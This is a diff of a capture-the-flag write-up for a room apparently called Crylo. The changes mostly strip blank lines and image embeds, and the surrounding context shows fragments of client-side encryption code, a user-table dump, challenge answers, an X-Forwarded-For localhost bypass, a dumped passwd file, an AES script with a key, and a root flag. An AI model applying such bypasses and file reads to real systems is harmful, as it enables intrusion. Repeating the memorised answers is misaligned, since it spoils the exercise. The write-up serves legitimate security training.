@@ -235,7 +235,6 @@ function submitForm(oFormElement) {
     return false;
 }
 
-
 function encrypt() {
     var pass = document.getElementById('pin2').value; {
         //document.getElementById("hide").value = document.getElementById("pin").value;
@@ -257,7 +256,6 @@ function encrypt() {
         console.log(document.getElementById('pin2').value)
     }
 }
-
 
 function encrypt2() {
     var pass = document.getElementById('pin3').value; {
@@ -505,7 +503,6 @@ Table: auth_user_user_permissions
 | id | user_id | permission_id |
 +----+---------+---------------+
 +----+---------+---------------+
-
 
 Certainly, here's an example of an SQL query to create an "auth_users" table with the basic structure I mentioned earlier:
 
@@ -797,13 +794,7 @@ admin:trigger
 
 Enter Your Pin: 
 
-
-
 ```
-
-![[Pasted image 20230813140103.png]]
-
-![[Pasted image 20230813140527.png]]
 
 What is the name of the first username?
 
@@ -814,8 +805,6 @@ What is the password for the above user?
 Brute-forcing is out of scope.
 
 *trigger*
-
-![[Pasted image 20230813152329.png]]
 
 ### Task 3  Encryption
 
@@ -867,7 +856,6 @@ function submitForm(oFormElement) {
     return false;
 }
 
-
 function encrypt() {
     var pass = document.getElementById('pin2').value; {
         //document.getElementById("hide").value = document.getElementById("pin").value;
@@ -889,7 +877,6 @@ function encrypt() {
         console.log(document.getElementById('pin2').value)
     }
 }
-
 
 function encrypt2() {
     var pass = document.getElementById('pin3').value; {
@@ -961,11 +948,7 @@ and log in again but with the pin u set
 
 Hello, admin
 
-
 ```
-
-![[Pasted image 20230813153547.png]]
-![[Pasted image 20230813153626.png]]
 
 Which library is used for encryption and decryption?
 
@@ -1054,8 +1037,6 @@ and not to forget adding header
 X-Forwarded-For:127.0.0.1
 
 http 80/tcp www # WorldWideWeb HTTP domain-s 853/udp # DNS over DTLS [RFC8094] socks 1080/tcp # socks proxy server http-alt 8080/tcp webcache # WWW caching service nbd 10809/tcp # Linux Network Block Device amanda 10080/tcp # amanda backup services canna 5680/tcp # cannaserver zope-ftp 8021/tcp # zope management by ftp tproxy 8081/tcp # Transparent Proxy omniorb 8088/tcp # OmniORB omniorb 8088/udp root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin bin:x:2:2:bin:/bin:/usr/sbin/nologin sys:x:3:3:sys:/dev:/usr/sbin/nologin sync:x:4:65534:sync:/bin:/bin/sync games:x:5:60:games:/usr/games:/usr/sbin/nologin man:x:6:12:man:/var/cache/man:/usr/sbin/nologin lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin mail:x:8:8:mail:/var/mail:/usr/sbin/nologin news:x:9:9:news:/var/spool/news:/usr/sbin/nologin uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin proxy:x:13:13:proxy:/bin:/usr/sbin/nologin www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin backup:x:34:34:backup:/var/backups:/usr/sbin/nologin list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin messagebus:x:103:106::/nonexistent:/usr/sbin/nologin syslog:x:104:110::/home/syslog:/usr/sbin/nologin _apt:x:105:65534::/nonexistent:/usr/sbin/nologin tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin landscape:x:109:115::/var/lib/landscape:/usr/sbin/nologin pollinate:x:110:1::/var/cache/pollinate:/bin/false usbmux:x:111:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin sshd:x:112:65534::/run/sshd:/usr/sbin/nologin systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin anof:x:1000:1000:anof:/home/anof:/bin/bash lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false mysql:x:113:117:MySQL Server,,,:/nonexistent:/bin/false crylo:x:1001:1001::/home/crylo:/bin/bash fwupd-refresh:x:114:118:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologin 
-
-
 
 ```
 
@@ -1199,7 +1180,6 @@ cat enc.py
 from base64 import b64encode, b64decode
 import base64
 
-
 # key = '/I02fMuSSvnouuu+/vyyD7NuSEVDB/0gte/z50dM0b4='
 # data = 'hello world!'
 
@@ -1208,7 +1188,6 @@ import base64
 # ciphertext = cipher.encrypt(padded_data)
 # print(b64encode(ciphertext))
 
-
 #from Crypto.Cipher import AES
 #from pkcs7 import PKCS7Encoder
 
@@ -1216,7 +1195,6 @@ import base64
 #mode = AES.MODE_CBC
 #iv = "8080808080808080".encode()
 #encoder = PKCS7Encoder()
-
 
 # encryptor = AES.new(key, mode, iv)
 # text = "Test@123"
@@ -1239,7 +1217,6 @@ import base64
 # print(output.decode("utf-8"))
 # #print("56iPf4PPRmHLusqyKpf7QQ==")
 
-
 from Crypto.Util.Padding import pad, unpad
 from Crypto.Cipher import AES
 from Crypto.Random import get_random_bytes
@@ -1255,7 +1232,6 @@ print(ct)
 #pt = unpad(cipher2.decrypt(b'\x9f\xc9P\xff\xb3Z\x94\x84\x8a\xeb1\xa2/\xba\x8d\xa5'), 16)
 #print(pt)
 #assert(data == pt)
-
 
 crylo@crylo:/home$ cd anof
 cd anof
@@ -1704,10 +1680,7 @@ root@crylo:~# cat flag.txt
 cat flag.txt
 201ea4139d9755d6c9384783df06dc7e
 
-
 ```
-
-![[Pasted image 20230813155010.png]]
 
 What is the name of the vulnerability used to gain system access?
 
@@ -1734,6 +1707,5 @@ What is the password for the above user?
 What is the root flag?
 
 *201ea4139d9755d6c9384783df06dc7e*
-
 
 [[CVE-2023-38408]]
